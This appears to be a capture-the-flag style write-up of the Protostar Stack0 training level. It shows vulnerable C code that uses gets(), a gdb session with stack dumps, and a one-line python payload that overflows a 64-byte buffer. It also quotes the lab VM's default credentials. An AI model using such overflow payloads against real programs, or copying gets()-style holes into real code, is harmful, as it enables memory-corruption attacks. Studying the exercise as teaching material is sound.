# Protostar - Stack0
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack0__
* About
    This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

    This level is at /opt/protostar/bin/stack0

* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

```


  Let's check for the assembly of the program
```
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   %ebp
0x080483f5 <main+1>:    mov    %esp,%ebp
0x080483f7 <main+3>:    and    $0xfffffff0,%esp
0x080483fa <main+6>:    sub    $0x60,%esp
0x080483fd <main+9>:    movl   $0x0,0x5c(%esp)
0x08048405 <main+17>:   lea    0x1c(%esp),%eax
0x08048409 <main+21>:   mov    %eax,(%esp)
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    0x5c(%esp),%eax
0x08048415 <main+33>:   test   %eax,%eax
0x08048417 <main+35>:   je     0x8048427 <main+51>    << Break here 
0x08048419 <main+37>:   movl   $0x8048500,(%esp)
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   movl   $0x8048529,(%esp)
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave  
0x08048434 <main+64>:   ret    
End of assembler dump.
```

Let's set a breakpoint at 0x08048417 to see what stack look like if we input some "A"
```
(gdb) b *0x08048417
Breakpoint 1 at 0x8048417: file stack0/stack0.c, line 13.
(gdb) run 
Starting program: /opt/protostar/bin/stack0 
AAAAAAAA

Breakpoint 1, 0x08048417 in main (argc=1, argv=0xbffff874) at stack0/stack0.c:13
13      stack0/stack0.c: No such file or directory.
        in stack0/stack0.c
(gdb) x/50xw $esp
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x41414141
0xbffff780:     0x41414141      0x08049600      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x08049620      0xbffff7c8      0x08048469
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
0xbffff7c0:     0x08048450      0x00000000      0xbffff848      0xb7eadc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
0xbffff7f0:     0x00000001      0xbffff830      0xb7ff0626      0xb7fffab0
0xbffff800:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff810:     0xbffff848      0xcfb222d8      0xe5e5f4c8      0x00000000
0xbffff820:     0x00000000      0x00000000
```

I just added 8 of "A" and then in the stack the "A" has been stored at 0xbffff77c. The "modified" variable has been stored at 0xbffff7bc. These two location has an address difference for 64 bytes so we have to put "A" for 64 bytes to full the buffer and put another character to overide "modified" variable. 
```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1

Breakpoint 1, 0x08048417 in main (argc=1, argv=0xbffff874) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) x/50xw $esp
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x41414141
0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x00000031
0xbffff7c0:     0x08048450      0x00000000      0xbffff848      0xb7eadc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
0xbffff7f0:     0x00000001      0xbffff830      0xb7ff0626      0xb7fffab0
0xbffff800:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff810:     0xbffff848      0x2dfde3cb      0x07aa35db      0x00000000
0xbffff820:     0x00000000      0x00000000
```

Now the value stored at 0xbffff7bc has been overflow so we could get the result now.
```
(gdb) c
Continuing.
you have changed the 'modified' variable
```



### _Solution_
```
user@protostar:~$ python -c 'print("A"*64 + "1")' | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```